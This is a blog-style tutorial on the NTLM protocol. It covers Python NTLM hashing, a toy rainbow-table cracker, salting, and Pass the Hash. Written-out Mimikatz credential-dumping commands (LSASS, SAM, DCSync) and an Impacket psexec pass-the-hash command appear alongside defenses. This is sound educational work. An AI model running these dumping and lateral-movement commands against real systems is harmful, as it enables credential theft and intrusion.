---
title: "NTLM Protocol and Common Attack Techniques"
description: "NTLM negotiation, challenge, and response; rainbow tables, salts, Pass the Hash, Python hash examples, Impacket, Mimikatz, and defenses."
date: "2025-09-05"
tags:
  - "NTLM"
  - "Active Directory"
  - "Cyber Security"
  - "Pentesting"
authors:
  - "bx"
draft: false
slug: "ntlm-protocol-and-attack-techniques-en"
lang: "en"
translationKey: "ntlm-protocol-and-attack-techniques"
---

# NTLM Protocol & Attack Techniques

Created: September 11, 2025, 16:56

## NTLM Protocol

Overview of the NTLM protocol

**NTLM (NT LAN Manager)** is an early Microsoft authentication protocol. It was originally used in the Windows NT era and still exists in Windows today, mainly for **compatibility**.

Its operation consists of three steps:

- **Negotiate**
    - The client tells the server: “I support the NTLM protocol.”
- **Challenge**
    - The server generates a random number, `Nonce`, and sends it to the client.
- **Response**
    - The client encrypts this number using the user's **NTLM hash**, producing `Response`.
    - The client sends `Response` to the server.
    - The server performs the same calculation using the user's stored NTLM hash. If the results match, it proves that the client knows the password.

Kerberos
Kerberos is a widely used network authentication protocol. It provides secure authentication between clients and servers in an untrusted network environment. Its central idea is to use a trusted third party to verify the identities of both communicating parties.
Core characteristic:
It is a ticket-based authentication protocol.

Its characteristics include:

- **The password itself is not transmitted**: no plaintext password appears during authentication.
- **Password-based hash**: the password hash (NT hash) participates in encryption.
- **Resistant to eavesdropping**: even if traffic is captured, an attacker obtains only `Challenge` and `Response`, which cannot be used to log in directly (unless relaying an attack or cracking the hash).

Implementing an NTLM hash

The overall logic is as follows:

```jsx
明文密码 → UTF-16LE编码 → MD4哈希 → 十六进制大写 → NTLM哈希
```

Python implementation: I wrote this rather casually.

```python
import hashlib
import struct

def md4(data):
    """
    手动实现MD4算法（因为新版本Python移除了MD4支持）
    """
    # MD4算法的辅助函数
    def f(x, y, z): return (x & y) | (~x & z)
    def g(x, y, z): return (x & y) | (x & z) | (y & z)
    def h(x, y, z): return x ^ y ^ z
    
    def rotleft(value, shift):
        return ((value << shift) | (value >> (32 - shift))) & 0xffffffff
    
    # 初始化MD4状态
    h0, h1, h2, h3 = 0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476
    
    # 预处理消息
    msg = bytearray(data)
    msg_len = len(data)
    msg.append(0x80)
    
    # 填充到56字节（mod 64）
    while len(msg) % 64 != 56:
        msg.append(0)
    
    # 添加原始长度（64位小端序）
    msg.extend(struct.pack('<Q', msg_len * 8))
    
    # 处理512位块
    for i in range(0, len(msg), 64):
        chunk = msg[i:i+64]
        w = list(struct.unpack('<16I', chunk))
        
        a, b, c, d = h0, h1, h2, h3
        
        # 第1轮
        s = [3, 7, 11, 19]
        for j in range(16):
            k = j
            a, b, c, d = d, rotleft((a + f(b, c, d) + w[k]) & 0xffffffff, s[j % 4]), b, c
        
        # 第2轮
        s = [3, 5, 9, 13]
        for j in range(16):
            k = (4 * j + j // 4) % 16
            a, b, c, d = d, rotleft((a + g(b, c, d) + w[k] + 0x5a827999) & 0xffffffff, s[j % 4]), b, c
        
        # 第3轮
        s = [3, 9, 11, 15]
        order = [0, 8, 4, 12, 2, 10, 6, 14, 1, 9, 5, 13, 3, 11, 7, 15]
        for j in range(16):
            k = order[j]
            a, b, c, d = d, rotleft((a + h(b, c, d) + w[k] + 0x6ed9eba1) & 0xffffffff, s[j % 4]), b, c
        
        # 更新哈希值
        h0 = (h0 + a) & 0xffffffff
        h1 = (h1 + b) & 0xffffffff
        h2 = (h2 + c) & 0xffffffff
        h3 = (h3 + d) & 0xffffffff
    
    # 返回最终哈希值
    return struct.pack('<4I', h0, h1, h2, h3)

# md4被删除了
def hash_ntlm(password):
    pass_utf16le = password.encode("utf-16le")
    md4_a = md4(pass_utf16le)
    return md4_a.hex().upper()

if __name__ == "__main__":
    demo = "bx33661"
    res = hash_ntlm(demo)
    print(res)
```

The result is as follows:

```python
@bx  /usr/bin/python3 /home/bx/文档/ntlm_hash.py
928502A1D17A400BEABCFCE5DB2AEB11
```

Looking at the implementation, we can clearly see the weaknesses.

They are:

- No salt, making it vulnerable to rainbow-table attacks.
- The MD4 algorithm is relatively weak.
- No key stretching is used.

**NTLM hashes are generally stored in the following two locations:**

From the process above, we can see that authentication depends on the **NTLM hash**, not the plaintext password.

- **SAM file:** For local accounts, hashes are stored in the `C:\Windows\System32\config\SAM` file. This file is locked while the system is running.

```bash
# mimikatz
lsadump::sam
```

- **LSASS process memory:** After a user logs in (whether locally, through Remote Desktop, or by running a service), the system caches that user's credentials (including the NTLM hash) in the memory of a process named `lsass.exe` (Local Security Authority Subsystem Service) to facilitate subsequent authentication. **This is the primary hash source for Pass the Hash attacks.**

```bash
#mimikatz
privilege::debug sekurlsa::logonpasswords
```

- **DCSync**

Simulates a domain controller replication request to retrieve user hashes from a DC.

```bash
mimikatz
lsadump::dcsync /user:DOMAIN\Administrator
```

Based on the logic described above:

## Attack

### Rainbow-table attack

To understand the core idea of rainbow tables, here is a more academic explanation.

The central idea is **not to store every hash value**. Instead, a clever method stores only the start and end of each “chain.”

It contains two key functions:

- **Hash function (H):** such as `H(password) = hash_value`
- **Reduction function (R):** its special purpose is to “reduce” a hash value to a string that looks like a password. **Note that this reduction function does not need to be the inverse of the hash function**; it is simply a format-conversion function. For example, it could use the first eight characters of a hash as the new “password.”

Honestly, though, this is difficult to understand the first time you encounter it.

What is the advantage of a rainbow-table attack? How does it differ from brute force, and why does it work?

A rainbow table consists of generated chains and a rainbow-table storage structure.

1. Chain generation
- Choose an initial password, for example `aaaaaa`.
- Calculate its hash: `H("aaaaaa")` -> `hash1`
- Apply the reduction function to the hash: `R(hash1)` -> `pwd2`
- Calculate the hash of the new password: `H(pwd2)` -> `hash2`
- Reduce it again: `R(hash2)` -> `pwd3`
- ... Repeat this process thousands of times to form an alternating “password-hash” chain.

`aaaaaa --(H)--> hash1 --(R)--> pwd2 --(H)--> hash2 --(R)--> ... --(H)--> final_hash`

2.Building the rainbow table

Store only the starting password and final hash of each chain.

A large number of such chains together form a rainbow table.

| **Starting password** | **Final hash** |
| --- | --- |
| `aaaaaa` | `hash_A_end` |
| `bbbbbb` | `hash_B_end` |
| `cccccc` | `hash_C_end` |
| ... | ... |
|  |  |

So how exactly do you query and use this rainbow table?

1. **Take the target hash.**
2. **Repeatedly apply the `R -> H` transformation to it and subsequent calculation results**, comparing each result with every **final hash** in the table.
3. **Once a match is found**, the target's chain has been identified.
4. **Starting from that chain's “starting password,”** repeat the `H -> R -> H ...` calculation process.
5. **During recalculation, compare every generated hash with the target hash.**
6. **When they match, the password from the preceding step is the final answer.**

Generating a rainbow-table script

Here we follow the core idea of rainbow tables.

```python
import hashlib
import string
import random

PASSWORD_LENGTH = 4
CHARSET = string.ascii_lowercase
CHAIN_LENGTH = 400
NUM_CHAINS = 4000

def hash_function(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest()

# 写一个归约函数
def reduction_func(hash_v,index):
    inthash = int(hash_v,16)
    inthash += index
    password = ""

    for _ in range(PASSWORD_LENGTH):
        password += CHARSET[inthash % len(CHARSET)]
        inthash //= len(CHARSET)
    return password

def generate_rainbow_table():
    print("=====生成彩虹表=====")
    rainbow_table = {}
    for i in range(NUM_CHAINS):
        # 初始密码
        start_password = ''.join(random.choice(CHARSET) for _ in range(PASSWORD_LENGTH))
        current_password = start_password
        for j in range(CHAIN_LENGTH):
            hash_val = hash_function(current_password)
            current_password = reduction_func(hash_val,j)
        
        end_hash = hash_function(current_password)

        rainbow_table[start_password] = end_hash
        if (i + 1) % (NUM_CHAINS // 10) == 0:
            print(f"已生成 {i + 1}/{NUM_CHAINS} 条链...")
    
    print("=====彩虹表生成完毕=====")
    return rainbow_table

def crack_password(target_hash, rainbow_table):
    """尝试使用彩虹表破解给定的哈希"""
    print(f"--- 目标哈希: {target_hash} ---")
    print("--- 开始破解... ---")

    # 阶段一：查找链条
    # 从链的末端开始，逐个位置向前尝试
    for i in range(CHAIN_LENGTH - 1, -1, -1):
        temp_hash = target_hash
        
        # 从目标哈希开始，执行 R->H 操作，直到链的末端
        for j in range(i, CHAIN_LENGTH):
            password = reduction_func(temp_hash, j)
            temp_hash = hash_function(password)
        
        # 检查计算出的最终哈希是否存在于彩虹表中
        for start_password, end_hash in rainbow_table.items():
            if temp_hash == end_hash:
                print(f"匹配成功！哈希可能在以 '{start_password}' 开头的链中。")
                
                # 阶段二：验证并找到密码
                # 从找到的链的起点开始，重现整条链
                current_password = start_password
                for k in range(CHAIN_LENGTH):
                    current_hash = hash_function(current_password)
                    if current_hash == target_hash:
                        # 找到了！
                        print(f"\n*** 破解成功！密码是: {current_password} ***")
                        return current_password
                    # 继续链的下一个环节
                    current_password = reduction_func(current_hash, k)
    
    print("\n--- 破解失败，密码不在彩虹表中。 ---")
    return None

    

if __name__ == "__main__":
    rainbow_table = generate_rainbow_table()

    original_password = "love"
    target_hash_to_crack = hash_function(original_password)

    crack_password(target_hash_to_crack,rainbow_table)

    print("完成！！！")

```

This value needs to be increased so that coverage is as broad as possible.

```powershell
CHAIN_LENGTH = 400
NUM_CHAINS = 4000
```

The program's final response

```powershell
=====生成彩虹表=====
已生成 400/4000 条链...
已生成 800/4000 条链...
已生成 1200/4000 条链...
已生成 1600/4000 条链...
已生成 2000/4000 条链...
已生成 2400/4000 条链...
已生成 2800/4000 条链...
已生成 3200/4000 条链...
已生成 3600/4000 条链...
已生成 4000/4000 条链...
=====彩虹表生成完毕=====
--- 目标哈希: b5c0b187fe309af0f4d35982fd961d7e ---
--- 开始破解... ---
匹配成功！哈希可能在以 'zola' 开头的链中。

*** 破解成功！密码是: love ***
完成！！！
```

This script is only a proof of concept.

It demonstrates the core idea.

```powershell
明文 → 哈希 → 归约 → 明文 → 哈希 → …
```

Now we can understand the entire process:

- **Repeatedly apply `归约函数 → 哈希` to the target hash to derive possible chain-end hashes.**
- **Check whether one equals an end_hash in the table.**
    - If the derived hash matches an entry in the table's `end_hash`, the target hash **may be in that chain**.
    - Remember the candidate starting point (the chain-head password).
- **Verification stage (replay the chain)**
    - Starting from that candidate, run the entire chain (hash → reduction → hash → ...).
    - Find the point in the chain equal to the target hash to recover the corresponding plaintext password.
    - If replay never encounters the target hash, this is a “false match,” and you must try another candidate.

### How salting works

After learning about rainbow tables above, let's look at how salting works. In modern cryptography, the formula is as follows:

```powershell
hash = H(password + salt)
```

The essence of a rainbow table is to precompute the mapping from **all possible plaintext passwords to hashes**.

An attacker would therefore have to generate a separate rainbow table for **each salt**, causing the cost to grow exponentially and making rainbow-table attacks impractical.
However, with a fixed or predictable salt, it is essentially similar to having no salt.

For security, a salt should be random.

Here is a conceptual script:

```python
import hashlib
import os

def salted_hash(password,salt:str=None):
    if salt is None:
        salt = os.urandom(16).hex()
    hash_val = hashlib.sha256((password + salt).encode()).hexdigest()
    return hash_val, salt

if __name__ == "__main__":
    pwd = "bx33661"
    hash_val, salt = salted_hash(pwd)
    print("保存的哈希:", hash_val)
    print("保存的盐  :", salt)

    # 验证
    hash_val_check, _ = salted_hash(pwd, salt)
    print("验证结果:", hash_val == hash_val_check)
```

The result is as follows:

```python
"C:\Program Files\Python312\python.exe" C:\Users\bx336\Desktop\HTB\ntlm\rainbow\salt_hash.py 
保存的哈希: da59c617b69f5ef217777810700934d9e6b89013a705aa14062d33148a66a103
保存的盐  : c1d1b85839f14eed150da0c94e1bd8bf
验证结果: True

进程已结束，退出代码为 0

```

### PTH attack

A typical attack process

A typical Pass the Hash attack in a domain environment generally proceeds as follows:

1. **Gain access to a host in the domain** (possibly with low privileges).
2. **Extract hashes from LSASS or SAM.**
3. **Use a PTH tool to establish a session:**
- Built into Windows:

```cmd
runas /netonly /user:DOMAIN\Administrator cmd
```

- Impacket:

```bash
python3 psexec.py DOMAIN/Administrator@TARGET -hashes <LMhash>:<NThash>
```

1. Continue lateral movement.

### Defensive measures

- Disable NTLM or restrict its use (replace it with Kerberos).
- Enable **LSASS protection (RunAsPPL):**

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f
```

### Simplified authentication flow

1. The client initiates a request.
2. The server sends a random **Challenge** (8 bytes).
3. The client calculates a Response using the **NTLM hash + Challenge**.
4. The server passes the Response to the domain controller (or local SAM database) for verification.

**Weaknesses**

- **The hash is the credential** → anyone who obtains the hash can authenticate (the core of PTH attacks).
- It cannot resist replay attacks (unless the Challenge is single-use and valid only for a short time).
- It has no strongly encrypted session ticket, so it is less secure than Kerberos.

### Impacket suite

Impacket is an “aircraft carrier” of command-line tools for internal network penetration testing: it wraps complex Windows network-protocol attacks in easy-to-use scripts.

Simply put, Impacket is a collection of Python libraries for working with network protocols.

[https://github.com/fortra/impacket](https://github.com/fortra/impacket)

### Mimikatz (“Kiwi”)

[https://github.com/ParrotSec/mimikatz](https://github.com/ParrotSec/mimikatz)

Common operations

**Elevate privileges**

```cmd
privilege::debug
```

**Export system credentials:**

```cmd
sekurlsa::logonpasswords
```

**Export the SAM database:**

```cmd
lsadump::sam
```

**Export cached domain credentials:**

```cmd
lsadump::cache
```

**Kerberos ticket operations:**

```cmd
sekurlsa::tickets
kerberos::list
```

**Export NTDS.dit (domain controller):**

```cmd
lsadump::dcsync /user:Administrator
```

## References

[https://www.cnblogs.com/kalixcn/p/18138330](https://www.cnblogs.com/kalixcn/p/18138330)

[https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/pass-the-hash-attack/](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/pass-the-hash-attack/)
